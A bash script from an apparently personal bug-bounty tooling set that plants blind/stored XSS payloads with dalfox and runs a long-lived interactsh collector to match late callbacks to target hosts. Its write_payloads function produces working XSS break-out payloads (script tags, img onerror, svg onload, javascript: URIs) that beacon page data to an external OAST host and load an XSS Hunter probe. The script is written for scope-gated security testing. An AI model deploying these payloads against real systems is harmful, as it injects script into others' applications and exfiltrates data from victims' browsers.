#!/usr/bin/env bash
# =============================================================================
# recon_blindxss.sh — BLIND / STORED-XSS lane (the #1 unused dalfox feature).
#
# WHY THIS IS UNIQUE (the MOTTO): everyone runs reflected XSS scanners; almost
# nobody stands up *persistent* blind-XSS collection. Stored/blind XSS fires
# hours-to-days later, inside an ADMIN/STAFF console (the most valuable context),
# from a payload the crowd never planted. That's dup-resistant, high-payout
# surface — but only if you (a) plant a correlatable payload and (b) keep a
# long-lived collector alive to catch the late fire and map it back.
#
# ARCHITECTURE (dual-beacon — each tool used for what it is best at):
#   * interactsh = the AUTONOMOUS BACKBONE. A persistent interactsh-client
#     (-sf session file => STABLE correlation-id across restarts) polls forever
#     and logs every callback to callbacks.jsonl. We plant a CRAFTED per-host
#     subdomain  <CID><token>.<oast-domain>  — interactsh routes ANY subdomain
#     whose first <cidl> chars equal our correlation-id to our client (verified
#     empirically). The collector strips the CID -> recovers <token> -> the
#     injection map (injections.jsonl) -> the (host,url) we planted into. A fire
#     mints a CONFIRMED stored-XSS finding via state.py -> 2IC verify -> #review
#     (HARD-GATED on ai_verdict='real', same as every other lane).
#   * XSS Hunter (js.rip) = the RICH FORENSIC layer. The same payload also loads
#     the operator's XSS Hunter probe, so every fire ALSO lands in the XSS Hunter
#     dashboard with screenshot + DOM + firing-page + secrets/CORS/.git detection
#     + email alert — the PoC-grade evidence for the actual report. (Hosted XSS
#     Hunter has no machine API, so interactsh — not it — drives auto-minting.)
#
# CONFIG  ~/.recon_blindxss.conf (LOCAL, never mirrored — it can hold a self-host
#   token + the operator's XSS Hunter id). Defaults to PUBLIC oast.* (works now);
#   drop in BLINDXSS_SERVER/BLINDXSS_TOKEN/BLINDXSS_DOMAIN for a self-hosted
#   interactsh server (own domain = not a WAF-blocklisted IOC = the upgrade path).
#
# SUBCOMMANDS
#   collector            run the persistent interactsh-client (long-lived; the daemon
#                        supervises it like the gungnir CT listener — d0k, NOT a target,
#                        so NOT vpn-gated: it must keep catching late fires even paused).
#   correlate            one correlation pass: new callbacks -> token -> mint/alert.
#   emit-payload H L F   register a per-host token (lane L), write the dual-beacon custom
#                        blind payload set to file F, print the dalfox -b URL on stdout.
#                        (called by recon_dast.sh inside its per-host loop.)
#   status               collector liveness + callback/injection/mint counters.
#   test                 print resolved config + the payload that WOULD be planted for a host.
#
# HARD LINE: blind XSS PROVES execution in someone's console — the payload only
#   beacons location.href / title / referrer (NEVER cookies/tokens/PII; XSS Hunter's
#   own richer capture is the operator's owned dashboard, their call). Plant only on
#   in-scope + PAYING hosts (the planter gates this). Confirm-then-report; no harvest.
# =============================================================================
set -uo pipefail
IFS=$'\n\t'
log()  { printf '[%s BLINDXSS] %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$*" >&2; }
warn() { printf '[%s BLINDXSS WARN] %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$*" >&2; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
source "$SCRIPT_DIR/recon_net.sh" 2>/dev/null || true   # discord_post/discord_hook
BASE_DIR="${BASE_DIR:-$HOME/recon}"
STATE_DIR="${STATE_DIR:-$BASE_DIR/state}"
BX_DIR="${BX_DIR:-$STATE_DIR/blindxss}"
V3_DB="${V3_DB:-$BASE_DIR/v3/findings.db}"
STATE_PY="${STATE_PY:-$REPO_DIR/engine/state.py}"
SCOPE_CHECK="${SCOPE_CHECK:-$SCRIPT_DIR/recon_scope_check.sh}"
ES_URL="${ES_URL:-http://127.0.0.1:9200}"
INDEX_NAME="${INDEX_NAME:-recon_alive}"
NETRC="${NETRC:-$HOME/.recon_es_netrc}"
ICLIENT="${ICLIENT:-$(command -v interactsh-client 2>/dev/null || echo "$HOME/go/bin/interactsh-client")}"

# State files (shared between the collector [d0k] and the planter/correlator [reconrun];
# the daemon ACLs $BX_DIR for both users).
CALLBACKS="$BX_DIR/callbacks.jsonl"     # interactsh -o (collector writes; correlator reads)
INJECTIONS="$BX_DIR/injections.jsonl"   # token -> {host,url,program,lane,...} (planter writes)
CID_FILE="$BX_DIR/cid.txt"              # "<CID>\t<DOMAIN>" (collector writes; planter+correlator read)
SESSION_FILE="$BX_DIR/session"          # interactsh -sf (stable correlation-id across restarts)
PAYLOAD_STORE="$BX_DIR/payload.txt"     # interactsh -psf (registered payloads)
PIDFILE="$BX_DIR/collector.pid"
SEEN="$BX_DIR/correlated.seen"          # sha1(callback line) already minted/alerted
COLLECTOR_LOG="$BX_DIR/collector.log"

# ---- config (defaults => public oast.*; ~/.recon_blindxss.conf overrides) ----
BLINDXSS_SERVER="${BLINDXSS_SERVER:-}"        # empty => interactsh-client default public list
BLINDXSS_TOKEN="${BLINDXSS_TOKEN:-}"          # auth token for a protected self-hosted server
BLINDXSS_DOMAIN="${BLINDXSS_DOMAIN:-}"        # informational/override; collector derives the real one
BLINDXSS_XSSHUNTER="${BLINDXSS_XSSHUNTER:-}"  # e.g. js.rip/eld0k — embeds the rich forensic probe
BLINDXSS_POLL="${BLINDXSS_POLL:-10}"          # interactsh poll interval (s)
BLINDXSS_N="${BLINDXSS_N:-1}"                 # payloads to register (1 is enough; we craft our own)
BLINDXSS_CIDL="${BLINDXSS_CIDL:-20}"          # correlation-id preamble length (server routing key)
BLINDXSS_SCORE="${BLINDXSS_SCORE:-15}"        # High/Crit class (a fire = confirmed execution)
BLINDXSS_CONF="${BLINDXSS_CONF:-0.9}"
BLINDXSS_CONF_FILE="${BLINDXSS_CONF_FILE:-$HOME/.recon_blindxss.conf}"
# shellcheck disable=SC1090
[[ -f "$BLINDXSS_CONF_FILE" ]] && source "$BLINDXSS_CONF_FILE" 2>/dev/null || true

mkdir -p "$BX_DIR" "$(dirname "$V3_DB")" 2>/dev/null || true
touch "$CALLBACKS" "$INJECTIONS" "$SEEN" 2>/dev/null || true

es() { curl -fsS -m 15 --netrc-file "$NETRC" -H 'Content-Type: application/json' "$@" 2>/dev/null; }

# ---- scope gate (in-scope + paying + not OOS) --------------------------------
in_scope_pays() {
  local h="$1"
  if [[ -x "$SCOPE_CHECK" ]]; then
    [[ "$(bash "$SCOPE_CHECK" "$h" 2>/dev/null | jq -r '((.in_scope//false)==true) and ((.pays//false)==true) and ((.out_of_scope//false)!=true)' 2>/dev/null)" == "true" ]]
  else
    [[ "$(es "$ES_URL/$INDEX_NAME/_source/$h" | jq -r '((.triage_in_scope//false)==true) and ((.triage_pays//false)==true) and ((.triage_out_of_scope//false)!=true) and ((.triage_scan_deny//false)!=true)' 2>/dev/null)" == "true" ]]
  fi
}

program_of() {
  local h="$1" p=""
  p="$(es "$ES_URL/$INDEX_NAME/_source/$h" | jq -r '.triage_program // ""' 2>/dev/null)"
  printf '%s' "$p"
}

# ---- read the live correlation id + base domain ------------------------------
read_cid() {   # prints "CID<TAB>DOMAIN" or empty
  [[ -s "$CID_FILE" ]] && head -1 "$CID_FILE" 2>/dev/null
}

# ---- write the dual-beacon custom blind payload set --------------------------
# $1 = beacon host (e.g. <CID><token>.oast.online) ; $2 = outfile.
# Each line is ONE break-out payload dalfox injects verbatim (--custom-blind-xss-payload).
# INLINE js (no double-quotes => safe inside double-quoted event attributes) beacons the
# FIRING PAGE to interactsh AND loads the XSS Hunter probe. The compact <script src>
# variants are for length-limited stored fields (firing page still arrives via Referer).
write_payloads() {
  local beacon="$1" out="$2"
  local hunter=""
  if [[ -n "$BLINDXSS_XSSHUNTER" ]]; then
    hunter="try{var s=document.createElement('script');s.src='//${BLINDXSS_XSSHUNTER}';(document.head||document.documentElement).appendChild(s)}catch(e){}"
  fi
  # IIFE: works in <script>, event-handler, javascript:, and js-string-break contexts.
  local js="(function(){try{(new Image).src='//${beacon}/bx?u='+encodeURIComponent(location.href)+'&t='+encodeURIComponent(document.title)+'&r='+encodeURIComponent(document.referrer)}catch(e){}${hunter}}())"
  {
    # compact dual <script src> (interactsh callback via subdomain + Referer; XSS Hunter probe)
    if [[ -n "$BLINDXSS_XSSHUNTER" ]]; then
      printf '%s\n' "\"><script src=//${BLINDXSS_XSSHUNTER}></script><script src=//${beacon}></script>"
      printf '%s\n' "</script><script src=//${BLINDXSS_XSSHUNTER}></script><script src=//${beacon}></script>"
    else
      printf '%s\n' "\"><script src=//${beacon}></script>"
    fi
    # rich inline beacons (carry the firing page in the path) across injection contexts
    printf '%s\n' "\"><script>${js}</script>"
    printf '%s\n' "\"><img src=x onerror=\"${js}\">"
    printf '%s\n' "\"><svg onload=\"${js}\">"
    printf '%s\n' "';${js};//"
    printf '%s\n' "javascript:${js}"
  } > "$out"
}

# =============================================================================
# collector — the PERSISTENT interactsh-client. Long-lived; the daemon restarts it
# if it dies (like gungnir). -sf keeps the correlation-id stable across restarts so
# tokens planted before a restart still correlate after.
# =============================================================================
cmd_collector() {
  [[ -x "$ICLIENT" ]] || { warn "interactsh-client missing ($ICLIENT)"; exit 0; }
  exec 9>"$BX_DIR/collector.lock"; flock -n 9 || { warn "collector already running"; exit 0; }
  local cpid=""
  cleanup_collector() { [[ -n "$cpid" ]] && kill "$cpid" 2>/dev/null; rm -f "$PIDFILE" 2>/dev/null || true; }
  trap cleanup_collector EXIT TERM INT
  local args=(-sf "$SESSION_FILE" -json -o "$CALLBACKS" -ps -psf "$PAYLOAD_STORE"
              -n "$BLINDXSS_N" -pi "$BLINDXSS_POLL" -duc)
  [[ -n "$BLINDXSS_SERVER" ]] && args+=(-s "$BLINDXSS_SERVER")
  [[ -n "$BLINDXSS_TOKEN"  ]] && args+=(-t "$BLINDXSS_TOKEN")
  [[ "$BLINDXSS_CIDL" != "20" ]] && args+=(-cidl "$BLINDXSS_CIDL")
  : > "$PAYLOAD_STORE" 2>/dev/null || true
  log "collector starting · server=${BLINDXSS_SERVER:-public} poll=${BLINDXSS_POLL}s"
  "$ICLIENT" "${args[@]}" >>"$COLLECTOR_LOG" 2>&1 &
  cpid=$!
  echo "$cpid" > "$PIDFILE"
  # capture the registered payload -> CID + base domain (the routing context)
  local pay="" i
  for ((i=0;i<40;i++)); do
    pay="$(grep -aoE '[a-z0-9]+\.[a-z0-9.]*(oast\.(pro|live|site|online|fun|me)|interact\.sh|'"${BLINDXSS_DOMAIN//./\\.}"')' "$PAYLOAD_STORE" 2>/dev/null | head -1)"
    [[ -n "$pay" ]] && break
    kill -0 "$cpid" 2>/dev/null || { warn "collector died before registering — see $COLLECTOR_LOG"; break; }
    sleep 1
  done
  if [[ -n "$pay" ]]; then
    local label="${pay%%.*}" dom="${pay#*.}"
    local cid="${label:0:$BLINDXSS_CIDL}"
    printf '%s\t%s\n' "$cid" "$dom" > "$CID_FILE"
    log "registered · CID=$cid domain=$dom (callbacks -> $CALLBACKS)"
  else
    warn "no payload registered (interactsh server unreachable?) — collector still up, will retry on restart"
  fi
  wait "$cpid"   # block until the client exits; the daemon's restart loop relaunches us
  rm -f "$PIDFILE" 2>/dev/null || true
}

# =============================================================================
# correlate — one pass. New callbacks (to OUR correlation id) -> strip CID ->
# token -> injection map -> mint a CONFIRMED stored-XSS finding (gated) + alert.
# =============================================================================
urldecode() { python3 -c 'import sys,urllib.parse;print(urllib.parse.unquote(sys.argv[1]))' "$1" 2>/dev/null || printf '%s' "$1"; }

cmd_correlate() {
  command -v jq >/dev/null 2>&1      || { warn "jq missing"; exit 0; }
  command -v python3 >/dev/null 2>&1 || { warn "python3 missing"; exit 0; }
  [[ -s "$CALLBACKS" ]] || { log "no callbacks yet"; exit 0; }
  local cidline cid dom
  cidline="$(read_cid)"; cid="${cidline%%$'\t'*}"; dom="${cidline##*$'\t'}"
  [[ -n "$cid" ]] || { warn "no correlation-id yet (collector not registered) — cannot correlate"; exit 0; }
  exec 8>"$BX_DIR/correlate.lock"; flock -n 8 || { warn "correlate already running"; exit 0; }

  local minted=0 leads=0 line key full proto remote ts token rec host url prog raw firing
  while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    key="$(printf '%s' "$line" | sha1sum | cut -d' ' -f1)"
    grep -qxF "$key" "$SEEN" 2>/dev/null && continue
    full="$(printf '%s' "$line"  | jq -r '."full-id" // ."unique-id" // ""' 2>/dev/null)"
    [[ -z "$full" ]] && { printf '%s\n' "$key" >> "$SEEN"; continue; }
    # only our correlation id (the client should only return ours, but be strict)
    [[ "${full:0:${#cid}}" == "$cid" ]] || { printf '%s\n' "$key" >> "$SEEN"; continue; }
    token="${full:${#cid}}"
    proto="$(printf '%s' "$line"  | jq -r '.protocol // "?"' 2>/dev/null)"
    remote="$(printf '%s' "$line" | jq -r '."remote-address" // "?"' 2>/dev/null)"; remote="${remote%%:*}"
    ts="$(printf '%s' "$line"     | jq -r '.timestamp // ""' 2>/dev/null)"
    raw="$(printf '%s' "$line"    | jq -r '."raw-request" // ""' 2>/dev/null)"
    # firing page: prefer the inline beacon's ?u=, else the Referer header
    firing=""
    local upart
    upart="$(printf '%s' "$raw" | grep -aoE '[?&]u=[^ &]+' | head -1 | sed -E 's/^[?&]u=//')"
    [[ -n "$upart" ]] && firing="$(urldecode "$upart")"
    [[ -z "$firing" ]] && firing="$(printf '%s' "$raw" | grep -aiE '^Referer:' | head -1 | sed -E 's/^[Rr]eferer:[[:space:]]*//' | tr -d '\r')"

    rec=""; [[ -n "$token" ]] && rec="$(grep -aF "\"token\":\"$token\"" "$INJECTIONS" 2>/dev/null | tail -1)"
    if [[ -n "$rec" ]]; then
      host="$(printf '%s' "$rec" | jq -r '.host // ""' 2>/dev/null)"
      url="$( printf '%s' "$rec" | jq -r '.url  // ""' 2>/dev/null)"
      prog="$(printf '%s' "$rec" | jq -r '.program // ""' 2>/dev/null)"
      [[ -z "$prog" ]] && prog="$(program_of "$host")"
      # re-gate scope at mint time (belt-and-suspenders; we only ever plant in-scope)
      if [[ -n "$host" ]] && ! in_scope_pays "$host"; then
        warn "fire correlated to $host but it is NOT in-scope/paying now — alert only, not minting"
        rec=""   # fall through to lead
      fi
    fi

    if [[ -n "$rec" && -n "$host" ]]; then
      local ev
      ev="$(jq -nc --arg fp "$firing" --arg h "$host" --arg u "$url" --arg tk "$token" \
            --arg pr "$proto" --arg rip "$remote" --arg t "$ts" --arg hunter "$BLINDXSS_XSSHUNTER" \
            '{probe:"interactsh-blindxss", firing_page:$fp, injected_host:$h, injected_url:$u,
              correlation_token:$tk, callback_protocol:$pr, callback_remote_ip:$rip, callback_time:$t,
              xsshunter:(if $hunter=="" then null else ("full forensic report (screenshot/DOM/firing-page) in the XSS Hunter dashboard for "+$hunter) end),
              evidence:("BLIND/STORED XSS FIRED: a payload planted ONLY into \($h) executed in a victim browser at \(if $fp=="" then "an unknown page (see Referer/XSS Hunter)" else $fp end). The callback to our unique per-host canary = definitive out-of-band proof of execution (not mere reflection). Severity hinges on the firing-page context (admin/staff console => Critical). Operator: open the XSS Hunter dashboard for the screenshot/DOM PoC; re-test \($h) parameters to localise the sink.")}' 2>/dev/null)"
      if V3_DB="$V3_DB" python3 "$STATE_PY" record-confirmed \
           "$host" "${url:-https://$host}" "$prog" "blind-xss" "xss" "$BLINDXSS_SCORE" "$BLINDXSS_CONF" "$ev" >/dev/null 2>&1; then
        minted=$((minted+1))
        log "🔥 BLIND XSS FIRED · $host · firing=${firing:-?} proto=$proto → finding minted (pending 2IC verify → #review)"
        alert "🔥 BLIND/STORED XSS FIRED — $host" \
              "Firing page: ${firing:-unknown (see Referer / XSS Hunter)}\nProto: $proto · caller: ${remote:-?}\nFinding MINTED → 2IC verify → #review (gated).\nFull PoC (screenshot/DOM) in XSS Hunter: ${BLINDXSS_XSSHUNTER:-n/a}"
      else
        warn "record-confirmed failed for $host"
      fi
    else
      # uncorrelated but to OUR correlation id => our payload DID fire somewhere.
      # Don't auto-mint against an unknown/3rd-party host — surface for manual correlation.
      leads=$((leads+1))
      log "🔥 BLIND XSS FIRED (uncorrelated token=$token) · firing=${firing:-?} — manual correlate (XSS Hunter: ${BLINDXSS_XSSHUNTER:-n/a})"
      alert "🔥 BLIND XSS FIRED (manual-correlate) — token $token" \
            "Firing page: ${firing:-unknown (see Referer / XSS Hunter)}\nProto: $proto · caller: ${remote:-?}\nNo injection-map match (planted before this collector session, or via XSS Hunter-only payload).\nCheck the XSS Hunter dashboard: ${BLINDXSS_XSSHUNTER:-n/a}"
    fi
    printf '%s\n' "$key" >> "$SEEN"
  done < "$CALLBACKS"

  tail -n 20000 "$SEEN" > "$SEEN.tmp" 2>/dev/null && mv "$SEEN.tmp" "$SEEN" 2>/dev/null || true
  log "correlate done · minted=$minted manual-correlate-leads=$leads"
}

alert() {   # best-effort Discord heads-up; gated #review still comes via the reporter
  local title="$1" desc="$2" wh
  wh="$(discord_hook vulns 2>/dev/null || true)"
  [[ -z "$wh" ]] && return 0
  local payload
  payload="$(jq -nc --arg t "$title" --arg d "$desc" \
    '{embeds:[{title:$t,description:$d,color:15158332,footer:{text:"recon · blind-xss"}}]}' 2>/dev/null)"
  discord_post "$wh" "$payload" >/dev/null 2>&1 || true
}

# =============================================================================
# emit-payload <host> <lane> <outfile> — register a per-host token, write the
# dual-beacon custom payload set, print the dalfox -b URL. Used by recon_dast.sh.
# Returns non-zero (no output) if the collector isn't registered yet => caller
# falls back to no-blind, never an unattributable callback.
# =============================================================================
cmd_emit_payload() {
  local host="${1:-}" lane="${2:-dast}" out="${3:-}"
  [[ -n "$host" && -n "$out" ]] || { warn "usage: emit-payload <host> <lane> <outfile>"; return 1; }
  local cidline cid dom; cidline="$(read_cid)"; cid="${cidline%%$'\t'*}"; dom="${cidline##*$'\t'}"
  [[ -n "$cid" && -n "$dom" ]] || { warn "collector not registered (no cid.txt) — skipping blind for $host"; return 1; }
  # token = lane initial + 8-hex host hash + 4-hex random => unique per plant, DNS-safe,
  # label = cidl(20)+13 ≈ 33 chars (< 63). host hash groups re-plants for debugging.
  local hh rnd token
  hh="$(printf '%s' "$host" | sha1sum | cut -c1-8)"
  rnd="$(head -c4 /dev/urandom 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n' | cut -c1-4)"
  [[ -n "$rnd" ]] || rnd="$(printf '%04x' $((RANDOM % 65536)))"
  token="${lane:0:1}${hh}${rnd}"
  local beacon="${cid}${token}.${dom}"
  write_payloads "$beacon" "$out"
  local prog; prog="$(program_of "$host")"
  jq -nc --arg tk "$token" --arg h "$host" --arg u "https://$host" --arg p "$prog" \
        --arg l "$lane" --arg b "$beacon" --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
        '{token:$tk, host:$h, url:$u, program:$p, lane:$l, beacon:$b, injected_at:$ts}' >> "$INJECTIONS" 2>/dev/null || true
  printf 'https://%s\n' "$beacon"   # the dalfox -b URL
}

cmd_status() {
  local cidline cid dom up cbn injn mintn
  cidline="$(read_cid)"; cid="${cidline%%$'\t'*}"; dom="${cidline##*$'\t'}"
  up="DOWN"; [[ -s "$PIDFILE" ]] && kill -0 "$(cat "$PIDFILE" 2>/dev/null)" 2>/dev/null && up="UP (pid $(cat "$PIDFILE"))"
  cbn="$(wc -l < "$CALLBACKS" 2>/dev/null | tr -d ' ')"
  injn="$(wc -l < "$INJECTIONS" 2>/dev/null | tr -d ' ')"
  printf 'blind-xss lane\n'
  printf '  collector : %s\n' "$up"
  printf '  server    : %s\n' "${BLINDXSS_SERVER:-public oast.*}"
  printf '  correlation: CID=%s domain=%s\n' "${cid:-<unregistered>}" "${dom:-?}"
  printf '  xss-hunter: %s\n' "${BLINDXSS_XSSHUNTER:-<not set>}"
  printf '  callbacks : %s logged · injections planted: %s\n' "${cbn:-0}" "${injn:-0}"
  printf '  recent fires (correlated/minted go to findings.db -> #review):\n'
  [[ -s "$CALLBACKS" ]] && tail -5 "$CALLBACKS" | jq -rc '"   - "+(.protocol // "?")+" "+(."full-id" // "?")+" @ "+(.timestamp // "?")' 2>/dev/null || printf '   (none yet)\n'
}

cmd_test() {
  local host="${1:-example.com}" tmp; tmp="$(mktemp)"
  printf '=== resolved config ===\n'
  printf 'server=%s token=%s domain=%s xsshunter=%s cidl=%s\n' \
    "${BLINDXSS_SERVER:-public}" "${BLINDXSS_TOKEN:+<set>}" "${BLINDXSS_DOMAIN:-auto}" "${BLINDXSS_XSSHUNTER:-<none>}" "$BLINDXSS_CIDL"
  printf '=== payload that WOULD be planted for %s ===\n' "$host"
  local url; if url="$(cmd_emit_payload "$host" test "$tmp")"; then
    printf 'dalfox -b URL: %s\n' "$url"
    printf -- '--- custom-blind-xss-payload file ---\n'; cat "$tmp"
    # back out the test injection-map entry so `test` never pollutes real correlation
    grep -v '"lane":"test"' "$INJECTIONS" > "$INJECTIONS.tmp" 2>/dev/null && mv "$INJECTIONS.tmp" "$INJECTIONS" 2>/dev/null || true
  else
    printf '(collector not registered — start it: recon-ctl blindxss collector)\n'
  fi
  rm -f "$tmp"
}

case "${1:-status}" in
  collector)     cmd_collector ;;
  correlate)     shift; cmd_correlate "$@" ;;
  emit-payload)  shift; cmd_emit_payload "$@" ;;
  status)        cmd_status ;;
  test)          shift; cmd_test "$@" ;;
  *) echo "usage: recon_blindxss.sh {collector|correlate|emit-payload <host> <lane> <outfile>|status|test [host]}" >&2; exit 1 ;;
esac
